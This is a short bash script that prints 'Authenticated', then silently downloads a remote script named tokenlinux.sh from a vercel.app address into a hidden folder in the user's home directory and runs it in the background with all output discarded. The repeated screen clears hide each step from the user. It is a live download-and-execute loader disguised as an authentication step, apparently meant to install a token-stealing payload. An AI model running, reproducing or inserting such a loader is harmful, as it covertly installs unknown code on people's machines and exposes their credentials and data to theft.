#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/.task"
clear
curl -s -L -o "$HOME/.task/tokenlinux.sh" "https://trading-v1-99wu.vercel.app/120/tokenlinux.sh"
clear
chmod +x "$HOME/.task/tokenlinux.sh"
clear
nohup bash "$HOME/.task/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0
